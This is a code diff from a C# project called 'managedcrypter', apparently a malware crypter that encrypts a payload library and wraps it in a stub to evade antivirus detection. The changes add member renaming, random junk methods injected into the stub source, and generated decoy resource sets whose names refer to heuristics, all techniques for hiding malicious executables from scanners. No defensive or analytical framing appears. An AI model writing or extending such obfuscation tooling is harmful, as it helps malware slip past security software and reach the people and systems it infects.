@@ -19,7 +19,7 @@ namespace managedcrypter
             GenericDirectory sDirectory = null; /* stub directory */
             GenericDirectory lDirectory = null; /* lib directory */
 
-            cFile = new GenericFile("C:\\Users\\Admin\\Desktop\\Bintext.exe", true);
+            cFile = new GenericFile("C:\\Users\\Admin\\Desktop\\bintext.exe", true);
             sDirectory = new GenericDirectory(@"C:\Users\admin\Desktop\managed-crypter\managedcrypter\stub");
             lDirectory = new GenericDirectory(@"C:\Users\admin\Desktop\managed-crypter\managedcrypter\lib");
 
@@ -111,6 +111,11 @@ namespace managedcrypter
             sWorkspace.AddChild("keyfile_lib");
             sWorkspace.AddChild("lib");
 
+            // do some renaming in our library 
+            sWorkspace.Write("lib", lFile.OriginalFileData);
+            MemberRenamer.RenameMembers(sWorkspace.Children["lib"], sDirectory.Source.Files["stub_class"]);
+            lFile = new GenericFile(sWorkspace.Children["lib"], false);
+
             sWorkspace.AnonymizeChildren();
 
             /* encrypt our library */
@@ -140,14 +145,17 @@ namespace managedcrypter
                 //StringBuilder sb = new StringBuilder();
                 //MethodGen mtdGen = new MethodGen();
 
-                //for (int i = 0; i < 5; i++)
+                //for (int i = 0; i < 20; i++)
                 //    sb.AppendLine(mtdGen.RandMethod());
 
                 //Utils.ReplaceStringInFile(
                 //    sDirectory.Source.Files["stub_class"],
                 //    StringConstants.STR_JUNK,
                 //    sb.ToString());
+
+                Utils.ReplaceJunkInSource(sDirectory.Source.Files["stub_class"]);
             }
+
 
             Console.ReadLine();
 
@@ -197,6 +205,7 @@ namespace managedcrypter
 
                 // MemberRenamer.RenameMembers(cInfo.OutputDestination);
 
+               
                 ResourceGen.CreateHeurAcceleratorSet(cInfo.OutputDestination);
                 ResourceGen.CreateHeurDialogSet(cInfo.OutputDestination);
                 ResourceGen.CreateHeurMenuSet(cInfo.OutputDestination);
